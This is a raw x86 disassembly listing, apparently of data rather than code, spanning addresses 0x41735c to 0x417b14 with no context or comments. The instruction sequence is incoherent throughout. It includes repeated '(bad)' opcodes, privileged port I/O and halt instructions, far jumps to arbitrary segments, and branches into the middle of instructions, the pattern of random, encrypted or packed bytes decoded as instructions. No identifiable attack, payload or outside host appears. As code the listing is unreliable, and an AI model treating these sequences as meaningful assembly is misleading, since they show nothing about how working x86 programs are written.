  41735c:	das    
  41735d:	fcom   DWORD PTR [esi+0x48]
  417360:	in     eax,dx
  417361:	jmp    0x41733c
  417363:	jmp    ecx
  417365:	dec    ebp
  417366:	clc    
  417367:	int    0x53
  417369:	or     dh,al
  41736b:	stc    
  41736c:	imul   eax,DWORD PTR [eax-0x74],0x15
  417370:	xchg   BYTE PTR [ebx-0x5d],dl
  417373:	popf   
  417374:	ret    
  417375:	adc    dh,BYTE PTR [ecx-0x23]
  417378:	adc    ecx,DWORD PTR [ecx]
  41737a:	in     eax,dx
  41737b:	push   eax
  41737c:	dec    edi
  41737d:	cs test dl,cl
  417380:	retf   0xa257
  417383:	dec    esi
  417384:	cmp    edi,edi
  417386:	std    
  417387:	scas   eax,DWORD PTR es:[edi]
  417388:	sar    DWORD PTR [eax+edi*2+0x1e],1
  41738c:	rcr    bh,0x82
  41738f:	xchg   edx,eax
  417390:	mov    edx,0x4222c10f
  417395:	in     eax,0xfc
  417397:	es push ecx
  417399:	shl    DWORD PTR [edi+0x86ff0d4],0xc8
  4173a0:	aam    0x73
  4173a2:	leave  
  4173a3:	leave  
  4173a4:	adc    al,0x45
  4173a6:	es idiv dh
  4173a9:	xchg   esp,eax
  4173aa:	inc    edi
  4173ab:	pop    edi
  4173ac:	in     al,dx
  4173ad:	add    bh,BYTE PTR [edx]
  4173af:	pop    ecx
  4173b0:	outs   dx,DWORD PTR ds:[esi]
  4173b1:	xor    al,0xb9
  4173b3:	push   es
  4173b4:	fild   QWORD PTR es:[ecx-0x54]
  4173b8:	mov    dh,0x4
  4173ba:	pushf  
  4173bb:	inc    esp
  4173bc:	(bad)  
  4173bd:	cli    
  4173be:	cld    
  4173bf:	sub    eax,0x8685698c
  4173c4:	inc    esp
  4173c5:	mul    edx
  4173c7:	fwait
  4173c8:	xor    bh,bl
  4173ca:	push   ebx
  4173cb:	ja     0x417448
  4173cd:	cmp    bl,BYTE PTR [esp+ebp*1+0x3e]
  4173d1:	xchg   ebp,eax
  4173d2:	test   BYTE PTR [edx-0x6a],bh
  4173d5:	push   edi
  4173d6:	std    
  4173d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d8:	shr    BYTE PTR [esi],cl
  4173da:	in     al,dx
  4173db:	ja     0x4173a2
  4173dd:	jae    0x417422
  4173df:	enter  0xdce4,0x8c
  4173e3:	mov    bl,0xcf
  4173e5:	lea    edx,ds:0x2025eb4c
  4173eb:	lea    edx,ds:0x6b4605d0
  4173f1:	loop   0x4173ec
  4173f3:	inc    edx
  4173f4:	push   eax
  4173f5:	ins    BYTE PTR es:[edi],dx
  4173f6:	jne    0x4173c3
  4173f8:	aaa    
  4173f9:	(bad)  
  4173fa:	into   
  4173fb:	sub    bh,BYTE PTR [ebx+0x58]
  4173fe:	adc    bl,BYTE PTR [ecx+0x7c595af2]
  417404:	cmc    
  417405:	pusha  
  417406:	adc    BYTE PTR es:[ebx-0x5c],bh
  41740a:	add    eax,0x54df2136
  41740f:	int3   
  417410:	xchg   BYTE PTR [ebx],bh
  417412:	inc    esi
  417413:	into   
  417414:	xchg   esp,eax
  417415:	jmp    0x4173ab
  417417:	inc    ecx
  417418:	sbb    ecx,DWORD PTR [ecx+esi*1-0x2d]
  41741c:	mul    ebx
  41741e:	dec    edx
  41741f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417420:	dec    edx
  417421:	mov    ah,0x52
  417423:	dec    eax
  417424:	out    0xa0,eax
  417426:	mov    bh,0x93
  417428:	add    BYTE PTR [eax-0x1c125a00],al
  41742e:	jo     0x417458
  417430:	push   ebp
  417431:	xchg   ebp,eax
  417432:	loop   0x417484
  417434:	ret    0xbed2
  417437:	enter  0x4faa,0xb4
  41743b:	xchg   edi,eax
  41743c:	or     DWORD PTR [edi+0x8ebd217],edi
  417442:	nop
  417443:	mov    eax,ds:0x9da79a40
  417448:	mov    edi,ebx
  41744a:	cs xchg edx,eax
  41744c:	ins    BYTE PTR es:[edi],dx
  41744d:	fidiv  DWORD PTR [ebp+0x5c]
  417450:	sbb    eax,0x5394ffce
  417455:	mov    dh,0xc7
  417457:	jge    0x41745e
  417459:	ja     0x41748c
  41745b:	push   esi
  41745c:	jns    0x41743e
  41745e:	lea    edx,[eax-0x56]
  417461:	mov    eax,ds:0xb25f77f7
  417466:	sbb    eax,0xda61ebe4
  41746b:	inc    esp
  41746c:	in     al,0x55
  41746e:	es pop ebx
  417470:	fwait
  417471:	loopne 0x41742a
  417473:	and    cl,BYTE PTR [edx+ebp*2]
  417476:	ret    
  417477:	js     0x4174d0
  417479:	mov    dl,0x6
  41747b:	adc    DWORD PTR ds:0x20f1fcde,ebx
  417481:	mov    ebx,0xa1524014
  417486:	mov    WORD PTR [esi-0x37f50001],?
  41748c:	ds scas eax,DWORD PTR es:[edi]
  41748e:	jb     0x4174a9
  417490:	aad    0xb5
  417492:	add    BYTE PTR [esi],bh
  417494:	cld    
  417495:	xor    BYTE PTR [esp+ecx*1-0x4d],0x9f
  41749a:	mov    ax,0x71bd
  41749e:	cdq    
  41749f:	jecxz  0x4174b3
  4174a1:	enter  0xdb67,0xa
  4174a5:	das    
  4174a6:	fistp  QWORD PTR ds:0xbe94d113
  4174ac:	jmp    0xdf2612f1
  4174b1:	add    al,0x38
  4174b3:	or     BYTE PTR [edi-0x1d],ah
  4174b6:	jb     0x41747f
  4174b8:	adc    eax,0x83dcea53
  4174bd:	scas   eax,DWORD PTR es:[edi]
  4174be:	push   ebp
  4174bf:	popf   
  4174c0:	xor    eax,0x880fd50
  4174c5:	fs xchg edi,eax
  4174c7:	inc    ecx
  4174c8:	push   edi
  4174c9:	(bad)  
  4174ca:	(bad)  
  4174cc:	rol    esi,cl
  4174ce:	or     DWORD PTR [ecx+0x149d99cc],edx
  4174d4:	jbe    0x41749d
  4174d6:	std    
  4174d7:	ret    0xa95f
  4174da:	hlt    
  4174db:	xchg   ebp,eax
  4174dc:	test   BYTE PTR [edx],ch
  4174de:	mov    ch,0x38
  4174e0:	add    BYTE PTR [ebp-0xb8b365d],0x93
  4174e7:	data16 fsubr st,st(7)
  4174ea:	xor    al,BYTE PTR [edi+ebp*1]
  4174ed:	sub    bh,ch
  4174ef:	call   0xda79:0x6aba370a
  4174f6:	adc    al,cl
  4174f8:	sbb    al,0x2f
  4174fa:	jnp    0x417568
  4174fc:	lahf   
  4174fd:	les    eax,FWORD PTR [ebp+0x3c18ebfa]
  417503:	fadd   DWORD PTR [eax]
  417505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417506:	cs ins DWORD PTR es:[edi],dx
  417508:	popa   
  417509:	fbld   TBYTE PTR [edi+0x4c22890c]
  41750f:	push   esp
  417510:	addr16 call 0xc275:0x4beb066c
  417518:	call   FWORD PTR [ecx-0x23a0e9df]
  41751e:	push   edx
  41751f:	aad    0xfa
  417521:	push   ebp
  417522:	inc    esi
  417523:	rol    DWORD PTR [ebx-0x54],cl
  417526:	sbb    BYTE PTR [ebx],cl
  417528:	or     esi,DWORD PTR [edi+0x605d63fc]
  41752e:	adc    edi,edi
  417530:	loopne 0x417540
  417532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417533:	enter  0x9661,0xb1
  417537:	shr    BYTE PTR [ecx-0x71],1
  41753a:	mov    ch,0x9b
  41753c:	sbb    bh,BYTE PTR [edi+0x2c0f89ed]
  417542:	std    
  417543:	(bad)  
  417544:	repnz pushf 
  417546:	frstor [ebp+0x5f]
  417549:	sub    esi,ebx
  41754b:	mov    DWORD PTR [ebx+0x38d6aa0d],0xebaddc50
  417555:	ss in  eax,dx
  417557:	and    ch,dh
  417559:	jmp    0x4175d2
  41755b:	xor    eax,0x8669ea8f
  417560:	pop    edi
  417561:	and    ecx,DWORD PTR [esi]
  417563:	fisttp QWORD PTR [eax]
  417565:	pop    ds
  417566:	xchg   edx,eax
  417567:	push   ss
  417568:	dec    eax
  417569:	call   0x523b:0xb8b741fc
  417570:	lock je 0x417500
  417573:	enter  0x3fc5,0x75
  417577:	pop    edi
  417578:	cmp    DWORD PTR [esi+0x4b],0xffffffdf
  41757c:	jmp    0x41757e
  41757e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41757f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417580:	xchg   ebp,eax
  417581:	pop    eax
  417582:	xlat   BYTE PTR ds:[ebx]
  417583:	mov    al,0xb6
  417585:	jecxz  0x4175cb
  417587:	retf   0x4a68
  41758a:	outs   dx,BYTE PTR ds:[esi]
  41758b:	dec    eax
  41758c:	xor    DWORD PTR [edi+ecx*2+0x10],esi
  417590:	in     al,dx
  417591:	xchg   edx,eax
  417592:	xor    dh,BYTE PTR [eax+eiz*2]
  417595:	mov    edx,0xf933a4a7
  41759a:	mov    edx,0xaf4eadc8
  41759f:	sub    esi,DWORD PTR [eax-0x1b]
  4175a2:	jb     0x41755e
  4175a4:	jmp    0x4175f8
  4175a6:	ds xchg esi,eax
  4175a8:	out    dx,al
  4175a9:	mov    edi,0x8f77d7a
  4175ae:	popf   
  4175af:	xlat   BYTE PTR ds:[ebx]
  4175b0:	jmp    0x41755d
  4175b2:	test   DWORD PTR [esi+0x78123d46],ecx
  4175b8:	jmp    0x417604
  4175ba:	jl     0x41753d
  4175bc:	(bad)  
  4175bd:	or     BYTE PTR [ebp-0x2827cb48],dh
  4175c3:	ss push ecx
  4175c5:	lods   eax,DWORD PTR ds:[esi]
  4175c6:	sbb    al,0x9f
  4175c8:	stos   DWORD PTR es:[edi],eax
  4175c9:	xor    eax,0x43fd821c
  4175ce:	lahf   
  4175cf:	dec    esp
  4175d0:	jmp    0x417633
  4175d2:	mov    ecx,0xae34f87c
  4175d7:	enter  0xac5e,0xa
  4175db:	dec    ebp
  4175dc:	mov    ecx,0xeb4b7300
  4175e1:	dec    esp
  4175e2:	jp     0x4175e4
  4175e4:	cmp    bl,ah
  4175e6:	cmp    ebx,esp
  4175e8:	stos   BYTE PTR es:[edi],al
  4175e9:	inc    ebx
  4175ea:	arpl   cx,cx
  4175ec:	mov    ebx,0x1c00f639
  4175f1:	cdq    
  4175f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175f3:	sub    al,0x7
  4175f5:	dec    edx
  4175f6:	std    
  4175f7:	push   esp
  4175f8:	inc    ecx
  4175f9:	ja     0x41765a
  4175fb:	dec    edx
  4175fc:	mov    BYTE PTR [esi-0x5f],ch
  4175ff:	enter  0x1dd7,0x56
  417603:	fdivr  st,st(4)
  417605:	test   al,0xe3
  417607:	hlt    
  417608:	out    0xd5,al
  41760a:	push   edx
  41760b:	mov    edx,0x48fcf0ee
  417610:	push   ecx
  417611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417612:	xchg   esi,eax
  417613:	mov    ebp,0x4883d474
  417618:	sbb    al,ah
  41761a:	sub    al,0x12
  41761c:	call   0x819b72c5
  417621:	lods   al,BYTE PTR ds:[esi]
  417622:	and    al,0xba
  417624:	into   
  417625:	mov    bl,0xb7
  417627:	mov    ebp,0x4f25a9df
  41762c:	adc    al,0xcc
  41762e:	jl     0x41763f
  417630:	mov    cl,0x6f
  417632:	jmp    0x5b44:0xde56ed04
  417639:	pop    ecx
  41763a:	or     eax,0xeba62a48
  41763f:	push   ds
  417640:	dec    ecx
  417641:	fild   WORD PTR [esi-0x7]
  417644:	mov    esp,0xc02cb1e0
  417649:	mov    ebx,0xe5c7ae2e
  41764e:	sub    eax,0xc171eb7a
  417653:	dec    edi
  417654:	sub    edx,ebx
  417656:	out    0xc7,al
  417658:	mov    ebx,0x3ae0f162
  41765d:	jl     0x417672
  41765f:	daa    
  417660:	call   0x9c00f6ac
  417665:	cli    
  417666:	mov    esp,0xcdfdb045
  41766b:	enter  0xc354,0xc0
  41766f:	fidivr DWORD PTR [ebx]
  417671:	les    ebx,FWORD PTR [edi]
  417673:	pop    edx
  417674:	pop    ss
  417675:	retf   
  417676:	cld    
  417677:	sbb    eax,0xa954a5f6
  41767c:	(bad)  
  41767d:	push   edx
  41767e:	pusha  
  41767f:	pop    eax
  417680:	mov    bl,bh
  417682:	aas    
  417683:	cmovae eax,DWORD PTR [eax+esi*1-0x4c]
  417688:	lahf   
  417689:	jae    0x417688
  41768b:	xor    al,0x97
  41768d:	cmc    
  41768e:	ja     0x4176cd
  417690:	rol    ah,1
  417692:	xchg   ecx,eax
  417693:	enter  0x8741,0x9d
  417697:	(bad)  
  417698:	xlat   BYTE PTR ds:[ebx]
  417699:	call   0x662fdc35
  41769e:	out    0x5b,al
  4176a0:	into   
  4176a1:	inc    edx
  4176a3:	jecxz  0x417635
  4176a5:	mov    eax,ds:0x4e4ec836
  4176aa:	jne    0x41767f
  4176ac:	sahf   
  4176ad:	je     0x417727
  4176af:	shr    bl,1
  4176b1:	sub    bl,ch
  4176b3:	xor    ah,BYTE PTR [ebp+0x18]
  4176b6:	xor    al,0xe4
  4176b8:	fild   WORD PTR [eax+0x55a0e62e]
  4176bf:	das    
  4176c0:	int3   
  4176c1:	retf   0x9ac
  4176c4:	in     al,dx
  4176c5:	lds    ebx,FWORD PTR [edx+0x7894a5a5]
  4176cb:	xchg   esp,eax
  4176cc:	retf   
  4176cd:	jns    0x417715
  4176cf:	enter  0x5abe,0x35
  4176d3:	sbb    al,0xb8
  4176d5:	(bad)  
  4176d6:	loop   0x4176f1
  4176d8:	out    dx,al
  4176d9:	add    DWORD PTR [eax+0x524000cd],esi
  4176df:	rcl    DWORD PTR [ebp-0x4173e731],1
  4176e5:	dec    eax
  4176e6:	in     al,0x7b
  4176e8:	jne    0x417763
  4176ea:	ror    eax,cl
  4176ec:	into   
  4176ed:	jle    0x4176d0
  4176ef:	inc    esi
  4176f0:	jbe    0x41772d
  4176f2:	and    ebp,ecx
  4176f4:	out    dx,al
  4176f5:	push   esi
  4176f6:	inc    edx
  4176f7:	mov    edx,0x71bb0300
  4176fc:	imul   esp,DWORD PTR [ebp+0x71],0x9
  417700:	out    0xdf,eax
  417702:	(bad)  
  417703:	adc    DWORD PTR ds:0xe55b07c9,ebx
  417709:	push   ebx
  41770a:	or     ecx,esi
  41770c:	in     al,0x77
  41770e:	std    
  41770f:	mov    BYTE PTR [edx+esi*1-0x20ce3b75],cl
  417716:	and    al,0xea
  417718:	test   DWORD PTR [edx],edi
  41771a:	addr16 out dx,eax
  41771c:	xchg   ebx,eax
  41771d:	or     edi,ebp
  41771f:	iret   
  417720:	xchg   edi,eax
  417721:	imul   ebp,DWORD PTR [ebx+0x6b],0x91f8bd9a
  417728:	aam    0x87
  41772a:	xor    cl,al
  41772c:	ja     0x41771e
  41772e:	sbb    ebp,DWORD PTR [ecx]
  417730:	stos   BYTE PTR es:[edi],al
  417731:	adc    eax,0x225bec7
  417736:	jl     0x417740
  417738:	rol    BYTE PTR ds:0x3226cce4,1
  41773e:	test   DWORD PTR [edx],eax
  417740:	jmp    0x41775c
  417742:	or     ebx,ebp
  417744:	lds    esp,FWORD PTR [esi+0x35]
  417747:	mov    DWORD PTR [ecx],ecx
  417749:	loopne 0x417707
  41774b:	pushf  
  41774c:	shl    BYTE PTR [eax],cl
  41774e:	dec    edi
  41774f:	imul   esp
  417751:	lods   al,BYTE PTR ds:[esi]
  417752:	push   ss
  417753:	xor    ebp,DWORD PTR [ebx+0x59]
  417756:	sti    
  417757:	daa    
  417758:	out    0xd3,al
  41775a:	call   0x5ced9535
  41775f:	jne    0x41778d
  417761:	aaa    
  417762:	inc    BYTE PTR [edi]
  417764:	out    dx,eax
  417765:	push   es
  417766:	leave  
  417767:	retf   0x2d69
  41776a:	hlt    
  41776b:	mov    ss,WORD PTR [ecx+edi*2-0x45]
  41776f:	mov    edi,DWORD PTR [esi]
  417771:	dec    eax
  417772:	sub    al,0x2f
  417774:	dec    ebx
  417775:	aad    0x7d
  417777:	or     eax,DWORD PTR [ecx]
  417779:	loopne 0x417719
  41777b:	inc    edi
  41777c:	outs   dx,DWORD PTR ds:[esi]
  41777d:	ins    BYTE PTR es:[edi],dx
  41777e:	adc    DWORD PTR [edx+ebx*1+0x4a],ebp
  417782:	add    ecx,edi
  417784:	adc    ebx,0x7c
  417787:	xchg   edi,eax
  417788:	in     al,dx
  417789:	int    0x60
  41778b:	mov    al,ds:0x6487dc64
  417790:	cld    
  417791:	mov    ds:0xac5b6b1b,eax
  417796:	ja     0x4177a9
  417798:	jmp    0x4177da
  41779a:	pop    ebx
  41779b:	jbe    0x417722
  41779d:	mov    ds:0xab24540e,al
  4177a2:	lock push edx
  4177a4:	jmp    0x5ca6:0xd62d5c8d
  4177ab:	pop    ds
  4177ac:	popa   
  4177ad:	adc    bh,ch
  4177af:	dec    ebp
  4177b0:	popf   
  4177b1:	rol    dh,0x6a
  4177b4:	outs   dx,BYTE PTR ds:[esi]
  4177b5:	jbe    0x417785
  4177b7:	xor    ch,BYTE PTR [eax]
  4177b9:	ffreep st(3)
  4177bb:	imul   esi,ebx,0xdeb45a86
  4177c1:	push   ecx
  4177c2:	xchg   edi,eax
  4177c3:	and    ecx,DWORD PTR [edi]
  4177c5:	imul   edi,ebp,0x68548003
  4177cb:	pop    esi
  4177cc:	cmp    DWORD PTR ds:0x92fec80a,edi
  4177d2:	ret    0xd331
  4177d5:	dec    ebx
  4177d6:	dec    edi
  4177d7:	xchg   bl,ch
  4177d9:	mov    al,0xc3
  4177db:	popa   
  4177dc:	out    0x30,al
  4177de:	lock xchg ebp,eax
  4177e0:	sahf   
  4177e1:	fistp  QWORD PTR [esi+eax*2+0x39bf64aa]
  4177e8:	pop    ecx
  4177e9:	je     0x4177e8
  4177eb:	ret    
  4177ec:	arpl   WORD PTR [edx-0x60],dx
  4177ef:	je     0x417783
  4177f1:	inc    eax
  4177f2:	(bad)
  4177f6:	push   ds
  4177f7:	sbb    BYTE PTR [esi-0x19423ebd],bl
  4177fd:	and    al,0xab
  4177ff:	ins    DWORD PTR es:[edi],dx
  417800:	sub    al,0x59
  417802:	dec    esi
  417803:	sub    eax,0x48b11035
  417808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417809:	fnstsw ax
  41780b:	push   esi
  41780c:	jne    0x417798
  41780e:	and    al,0xd9
  417810:	outs   dx,DWORD PTR ds:[esi]
  417811:	ret    0xb0e7
  417814:	sbb    BYTE PTR [edi+0x5f],bl
  417817:	cmp    eax,edi
  417819:	add    esp,DWORD PTR [edi+0x4604dff9]
  41781f:	das    
  417820:	jmp    0x41784b
  417822:	xchg   esi,eax
  417823:	fcmovnbe st,st(5)
  417825:	lock in eax,dx
  417827:	out    dx,al
  417828:	out    0x63,eax
  41782a:	mov    esp,0x7ca452a9
  41782f:	pop    ss
  417830:	in     eax,dx
  417831:	loop   0x417887
  417833:	test   al,0x14
  417835:	and    DWORD PTR [edx-0x1bc3af95],edx
  41783b:	out    dx,al
  41783c:	pop    esp
  41783d:	pop    edi
  41783e:	fidiv  WORD PTR [esi+0x7]
  417841:	sub    cl,BYTE PTR fs:[ebx-0x30f72d37]
  417848:	cdq    
  417849:	cld    
  41784a:	out    dx,eax
  41784b:	mov    DWORD PTR [ebx],ecx
  41784d:	cmp    esi,ebp
  41784f:	mov    BYTE PTR [eax+0x15d0fa47],bh
  417855:	mov    ecx,0x482a353c
  41785a:	ficom  DWORD PTR [edi-0x6c]
  41785d:	or     eax,0x455ee166
  417862:	std    
  417863:	dec    esp
  417864:	or     BYTE PTR [ebx+0x79],0xf
  417868:	mov    ah,0x67
  41786a:	std    
  41786b:	cdq    
  41786c:	push   ecx
  41786d:	xor    ebx,ebp
  41786f:	and    al,0x9a
  417871:	and    BYTE PTR [esi],dl
  417873:	retf   
  417874:	sub    esi,DWORD PTR [ebx-0x4605e794]
  41787a:	mov    ebp,0xe3431499
  41787f:	stc    
  417880:	xchg   ebp,eax
  417881:	(bad)  
  417882:	std    
  417883:	push   ds
  417884:	retf   
  417885:	or     cl,cl
  417887:	call   0xdfe1:0xc190bc96
  41788e:	mov    DWORD PTR [ebp+0x68],esi
  417891:	jecxz  0x417869
  417893:	iret   
  417894:	ins    DWORD PTR es:[edi],dx
  417895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417896:	cld    
  417897:	jbe    0x4178c2
  417899:	sbb    DWORD PTR gs:[eax],0xc8bdea08
  4178a0:	loope  0x417866
  4178a2:	add    ebp,DWORD PTR [edx+ecx*8]
  4178a5:	(bad)  
  4178a6:	fcom   DWORD PTR [edi-0x15]
  4178a9:	push   edi
  4178aa:	(bad)  
  4178ab:	(bad)  
  4178ac:	int    0x64
  4178ae:	repnz xchg edx,eax
  4178b0:	(bad)
  4178b3:	xchg   ebp,eax
  4178b4:	popa   
  4178b5:	bound  edx,QWORD PTR [ecx]
  4178b7:	add    cl,BYTE PTR [eax+0x1e]
  4178ba:	add    esi,DWORD PTR [edi-0x51]
  4178bd:	popf   
  4178be:	cld    
  4178bf:	adc    DWORD PTR [ebp+0x2f],eax
  4178c2:	xchg   ecx,eax
  4178c3:	jo     0x4178c8
  4178c5:	fbstp  TBYTE PTR [ecx]
  4178c7:	xor    edx,DWORD PTR [ebx+0x64c14a2d]
  4178cd:	iret   
  4178ce:	sbb    edi,DWORD PTR [edx-0x613acd15]
  4178d4:	jbe    0x4178b6
  4178d6:	test   al,0x26
  4178d8:	into   
  4178d9:	jmp    0x89a5:0x9fdf676f
  4178e0:	cmp    ebp,DWORD PTR [eax+0x63ebbb8d]
  4178e6:	jl     0x41789f
  4178e8:	mov    dh,0xa2
  4178ea:	pop    edi
  4178eb:	jmp    0x4178d3
  4178ed:	loop   0x417960
  4178ef:	pop    ebp
  4178f0:	out    dx,eax
  4178f1:	pop    ecx
  4178f2:	lahf   
  4178f3:	dec    eax
  4178f4:	pusha  
  4178f5:	and    DWORD PTR [ecx-0x2eaf4fc],ebp
  4178fb:	cdq    
  4178fc:	popf   
  4178fd:	sbb    dh,BYTE PTR [esi]
  4178ff:	and    eax,0xc9262070
  417904:	jl     0x41794c
  417906:	rcr    BYTE PTR [esi+0x4a],1
  417909:	add    eax,0xf16de8ac
  41790e:	cld    
  41790f:	call   0x4ce99869
  417914:	mov    edi,0xb3c7b603
  417919:	retf   0xabe3
  41791c:	fisttp DWORD PTR [edi-0x5af86aa2]
  417922:	or     bl,cl
  417924:	adc    DWORD PTR [ecx-0x9385303],0xdf261f7c
  41792e:	inc    ebx
  41792f:	inc    ebx
  417930:	leave  
  417931:	sub    eax,0xa2b946fe
  417936:	add    DWORD PTR [edx-0x33be2a08],ecx
  41793c:	test   BYTE PTR [ebp-0x608a040d],0x96
  417943:	sub    eax,0xeeab7ec2
  417948:	ins    BYTE PTR es:[edi],dx
  417949:	cmp    al,0x14
  41794b:	enter  0x38fe,0x63
  41794f:	sbb    DWORD PTR [ecx+0x79],ebx
  417952:	std    
  417953:	cdq    
  417954:	test   BYTE PTR [ebp-0x77],cl
  417957:	dec    ebp
  417958:	mov    ebp,0xd9c8451a
  41795d:	fmul   QWORD PTR [esi+0x6b]
  417960:	mov    edi,0xe424cc5f
  417965:	pop    ds
  417966:	pop    edi
  417967:	dec    eax
  417968:	jl     0x41790b
  41796a:	xchg   edi,eax
  41796b:	jb     0x4179e8
  41796d:	mov    eax,0x6474c809
  417972:	adc    bl,BYTE PTR [esi-0x7107a30b]
  417978:	jmp    0x417911
  41797a:	push   ss
  41797b:	icebp  
  41797c:	cld    
  41797d:	jae    0x4179a7
  41797f:	jbe    0x41793d
  417981:	fbld   TBYTE PTR [edx+0x6379edcd]
  417987:	inc    esp
  417988:	test   BYTE PTR [ebp-0x3],dh
  41798b:	sub    al,0xa8
  41798d:	inc    edi
  41798e:	clc    
  41798f:	inc    edi
  417990:	or     eax,0x3acad9cc
  417995:	or     eax,0x769733bc
  41799a:	push   ebp
  41799b:	out    dx,al
  41799c:	fbstp  TBYTE PTR [ecx-0x1264e204]
  4179a2:	xchg   edx,eax
  4179a3:	retf   0x3cd4
  4179a6:	pop    esi
  4179a7:	enter  0x26e1,0x30
  4179ab:	ss das 
  4179ad:	retf   
  4179ae:	pop    esp
  4179af:	or     ebx,ebp
  4179b1:	shl    DWORD PTR [edi],1
  4179b3:	sbb    DWORD PTR [edx+eiz*4],esi
  4179b6:	push   es
  4179b7:	mov    es,edi
  4179b9:	iret   
  4179ba:	cmp    cl,dh
  4179bc:	ja     0x4179ac
  4179be:	inc    eax
  4179bf:	push   edi
  4179c0:	in     al,dx
  4179c1:	sbb    DWORD PTR [ebx+0x51],esi
  4179c4:	cli    
  4179c5:	daa    
  4179c6:	pop    esi
  4179c7:	pop    esi
  4179c8:	jmp    0x417a2b
  4179ca:	pop    ebp
  4179cb:	push   esp
  4179cc:	xchg   esp,eax
  4179cd:	int    0x5e
  4179cf:	ds rcr edi,1
  4179d2:	shr    esi,1
  4179d4:	xlat   BYTE PTR ds:[ebx]
  4179d5:	in     al,0x4
  4179d7:	sbb    eax,0x2fcd514
  4179dc:	push   ecx
  4179dd:	xor    al,BYTE PTR [ebp-0x3f]
  4179e0:	lods   al,BYTE PTR ds:[esi]
  4179e1:	mov    bh,0x7f
  4179e3:	(bad)  
  4179e4:	out    dx,eax
  4179e5:	push   ds
  4179e6:	cmp    eax,0xb65f83f7
  4179eb:	pop    es
  4179ec:	shl    DWORD PTR [ecx-0x210b5e04],1
  4179f2:	imul   eax,DWORD PTR [ebp+0x7f],0x5a78a6e8
  4179f9:	mov    BYTE PTR [eax-0x6b],ch
  4179fc:	fild   WORD PTR ds:0xdff58e7c
  417a03:	in     al,0x5c
  417a05:	das    
  417a06:	std    
  417a07:	cmp    BYTE PTR [ecx+0x22],0x87
  417a0b:	in     al,0xc0
  417a0d:	push   DWORD PTR [esi]
  417a0f:	into   
  417a10:	out    0xd7,al
  417a12:	aam    0xe0
  417a14:	retf   
  417a15:	aad    0x13
  417a17:	jns    0x417a88
  417a19:	mov    al,ds:0x9ceb6b9a
  417a1e:	les    esp,FWORD PTR [eax]
  417a20:	ja     0x417a1c
  417a22:	lock cmp BYTE PTR [edi+ebx*8+0x3b109a2d],al
  417a2a:	aad    0xaf
  417a2c:	jb     0x417a4f
  417a2e:	std    
  417a2f:	mov    dl,0x3a
  417a31:	scas   al,BYTE PTR es:[edi]
  417a32:	push   cs
  417a33:	je     0x417a7e
  417a35:	xor    ebx,esp
  417a37:	mov    ebp,0x82ecb2d
  417a3c:	fs or  eax,0xde0540c6
  417a42:	add    ch,ah
  417a44:	neg    BYTE PTR [edi+0x1d5c96fc]
  417a4a:	jns    0x417a8b
  417a4c:	xchg   edi,eax
  417a4d:	fist   WORD PTR [edi+0x2635bab6]
  417a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a54:	mov    ebx,0x3b1effbc
  417a59:	ja     0x417aae
  417a5b:	in     al,0xda
  417a5d:	fcom   DWORD PTR [si+0xf5b]
  417a62:	xor    al,0x9b
  417a64:	inc    edi
  417a65:	call   0x8b1ed006
  417a6a:	mov    esi,0x260ab63
  417a6f:	loopne 0x417a32
  417a71:	dec    edx
  417a72:	mov    esp,0x157b4b39
  417a77:	mov    eax,0x7582dfc0
  417a7c:	lds    ebx,FWORD PTR [esi+0x73]
  417a7f:	rcr    DWORD PTR [ebx-0x7dff02cc],0x92
  417a86:	loop   0x417abe
  417a88:	in     eax,dx
  417a89:	inc    ebx
  417a8a:	sub    al,0xbe
  417a8c:	scas   eax,DWORD PTR es:[edi]
  417a8d:	add    ebp,DWORD PTR [ebp+0x75616a48]
  417a93:	mov    eax,ds:0x4bfd0412
  417a98:	scas   al,BYTE PTR es:[edi]
  417a99:	dec    ecx
  417a9a:	mov    esp,0xe50b0b0b
  417a9f:	(bad)  
  417aa0:	xor    eax,0x5f577a19
  417aa5:	aas    
  417aa6:	pop    edx
  417aa7:	dec    ecx
  417aa8:	inc    ebp
  417aa9:	pop    esp
  417aaa:	std    
  417aab:	xor    eax,edi
  417aad:	or     al,bl
  417aaf:	sub    DWORD PTR [eax],0xffffffdd
  417ab2:	sbb    al,cl
  417ab4:	sub    bl,ah
  417ab6:	adc    DWORD PTR [esi+edx*2],esi
  417ab9:	fadd   DWORD PTR [esp+edx*1-0x1a]
  417abd:	add    dl,ch
  417abf:	fcomp  DWORD PTR [edx+0x8]
  417ac2:	sbb    al,0x3f
  417ac4:	fild   DWORD PTR [ebp-0x17]
  417ac7:	xor    al,0x80
  417ac9:	ficomp WORD PTR [edi]
  417acb:	mov    ebp,0x30aa6211
  417ad0:	dec    esp
  417ad1:	and    edx,DWORD PTR [eax+0x8]
  417ad4:	jmp    0x417ad6
  417ad6:	shr    DWORD PTR [edx],cl
  417ad8:	and    BYTE PTR [ebx+0x7d],cl
  417adb:	sbb    BYTE PTR [edx-0x21],dh
  417ade:	retf   
  417adf:	add    esi,DWORD PTR [ecx]
  417ae1:	push   esi
  417ae2:	imul   esp,esp
  417ae5:	jno    0x417a7a
  417ae7:	test   ebx,ebp
  417ae9:	(bad)  
  417aea:	scas   al,BYTE PTR es:[edi]
  417aeb:	ins    BYTE PTR es:[edi],dx
  417aec:	xchg   ebx,esp
  417aee:	sub    esi,ebx
  417af0:	cmp    dh,bl
  417af2:	shl    eax,cl
  417af4:	enter  0x2f78,0xcb
  417af8:	int    0x23
  417afa:	cld    
  417afb:	xor    eax,0xbc201deb
  417b00:	mov    ds:0x2d9ed58f,al
  417b05:	aam    0x9b
  417b07:	inc    esp
  417b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b09:	fs je  0x417b17
  417b0c:	retf   
  417b0d:	ds retf 
  417b0f:	(bad)  
  417b10:	push   esi
  417b11:	in     al,dx
  417b12:	cld    
  417b13:	push   ebx
  417b14:	imul   eax,DWORD PTR [edi],0x541aebf6
